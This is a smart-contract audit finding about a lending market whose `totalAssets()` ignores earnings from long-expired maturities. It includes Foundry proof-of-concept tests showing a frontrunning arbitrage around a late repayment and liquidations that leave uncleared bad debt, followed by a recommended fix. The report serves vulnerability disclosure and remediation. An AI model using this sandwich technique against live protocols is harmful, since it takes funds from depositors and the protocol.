# Expired maturities longer than `FixedLib.INTERVAL` with unaccrued earnings may be arbitraged and/or might lead to significant bad debt creation

## Summary

`Market::totalAssets()` only accounts for the unassigned earnings of maturities that are in the future or during the past interval. Thus, if a maturity is repaid which was due more than 1 `INTERVAL`, `totalAssets()` will not account for it. This will impact users due to arbitrage and create bad debt during liquidations as collateral will be leftover, making it impossible to clean the bad debt.

## Vulnerability Detail

`Market::totalAssets()` includes the unassigned earnings up to `block.timestamp - (block.timestamp % FixedLib.INTERVAL);`, disregarding past maturities.

`Market::repayAtMaturity()` will convert into `floatingAssets` the past unassigned earnings, no matter how late the repayment is.

This discrepancy allows attackers to arbitrage the `Market` with minimal exposure (by sandwiching) the repayment.

Possible worse, it will lead to a lot of bad debt creation, as liquidations preview the `seizeAvailable` of a liquidatee in `Auditor::checkLiquidation()`, but the actual collateral balance of the user will be bigger due to the unaccrued earnings being converted to `floatingAssets`.

The following 2 POCs demonstrate both scenarios, add the tests to `Market.t.sol`:
```solidity
function test_POC_expired_maturities_LeftoverCollateral() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, 2*assets);

  // ALICE deposits and borrows at maturity
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  skip(2*maturity);

  // BOB deposits just to clear earnings accumulator and floating debt,
  // which would impact calculations. The discrepancy in totalAssets()
  // will be only due to floatingAssets increase by repaying maturities
  // It also deposits collateral to pay the liquidator
  vm.prank(BOB);
  market.deposit(assets, BOB);

  // ALICE has more debt than collateral, so all collateral should be seized
  (uint256 aliceAssets, uint256 aliceDebt) = market.accountSnapshot(ALICE);
  assertGt(aliceDebt, aliceAssets);

  address liquidator = makeAddr("liquidator");
  deal(address(asset), liquidator, 100_000 ether);
  vm.startPrank(liquidator);
  asset.approve(address(market), type(uint256).max);
  market.liquidate(ALICE, type(uint256).max, market);
  vm.stopPrank();

  // ALICE has leftover shares due to the floating assets increase
  // when paying the due maturity, so some debt will never be repaied
  (aliceAssets, aliceDebt) = market.accountSnapshot(ALICE);
  assertEq(aliceAssets, 46671780821917806592); // 46e18 assets
  assertEq(aliceDebt, 4005059259761449851306); // 4005e18 debt
}


function test_POC_expired_maturities_may_be_arbitraged() external {
  uint256 maturity = FixedLib.INTERVAL * 2;
  uint256 assets = 10_000 ether;
  ERC20 asset = market.asset();
  deal(address(asset), ALICE, 2*assets);

  // ALICE deposits and borrows at maturity
  vm.startPrank(ALICE);
  market.deposit(assets, ALICE);
  market.borrowAtMaturity(maturity, assets*78*78/100/100, type(uint256).max, ALICE, ALICE);
  vm.stopPrank();

  skip(maturity + FixedLib.INTERVAL + 1);

  // BOB frontruns ALICE's repayment
  vm.prank(BOB);
  uint256 bobShares = market.deposit(assets, BOB);

  // ALICE Repays, accruing the unassigned earnings to floating assets
  vm.prank(ALICE);
  market.repayAtMaturity(maturity, type(uint256).max, type(uint256).max, ALICE);

  // BOB got free assets
  assertEq(market.previewRedeem(bobShares), 10046671780821917806594);
}
```

## Impact

Risk free arbitrage by attackers and significant bad debt creation which may not be cleared on liquidations.

## Recommendation

Convert the unaccrued earnings to `earningsAccumulator` instead of directly to floating assets. In `Market::totalAssets()`, remove the section of previewing unaccrued earnings, as they will go through the `earningsAccumulator` and can not be arbitraged.
